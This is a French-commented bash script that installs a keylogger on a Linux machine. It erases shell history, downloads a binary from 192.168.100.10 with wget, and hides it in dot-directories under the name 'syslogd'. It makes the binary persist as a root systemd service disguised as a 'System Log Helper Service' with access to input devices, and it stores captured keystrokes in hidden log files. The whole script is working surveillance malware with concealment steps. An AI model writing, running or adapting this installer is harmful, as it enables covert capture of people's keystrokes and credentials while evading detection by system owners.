#!/bin/bash
# keylogger_install_fixed.sh

# Supprime l'historique
unset HISTFILE

# Crée les répertoires
mkdir -p /var/lib/.systemd /var/log/.systemd 2>/dev/null

# Télécharge le binaire
wget -q http://192.168.100.10:8080/syslogd -O /var/lib/.systemd/syslogd
chmod +x /var/lib/.systemd/syslogd

# Crée les fichiers de log vides avec permissions
touch /var/log/.systemd/keylog.txt /var/log/.systemd/details_keylog.txt 2>/dev/null
chmod 600 /var/log/.systemd/*.txt 2>/dev/null

# Service systemd avec permissions étendues
cat > /etc/systemd/system/syslog-helper.service << 'EOF'
[Unit]
Description=System Log Helper Service
After=multi-user.target

[Service]
Type=simple
ExecStart=/var/lib/.systemd/syslogd
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

# Donner tous les accès nécessaires
User=root
Group=root
CapabilityBoundingSet=CAP_SYS_ADMIN CAP_DAC_OVERRIDE
DeviceAllow=char-input rw
DevicePolicy=auto
NoNewPrivileges=no
PrivateDevices=no
PrivateTmp=no
ProtectHome=no
ProtectSystem=no
ReadWritePaths=/dev/input /var/log/.systemd

[Install]
WantedBy=multi-user.target
EOF

# Redémarre systemd et active le service
systemctl daemon-reload
systemctl enable syslog-helper.service 2>/dev/null
systemctl restart syslog-helper.service 2>/dev/null

# Vérifie
sleep 2
if systemctl is-active syslog-helper.service; then
    echo "✅ Service actif"
    echo "📝 Logs: /var/log/.systemd/keylog.txt"
else
    echo "❌ Échec, vérifiez avec: journalctl -u syslog-helper.service -n 20"
fi
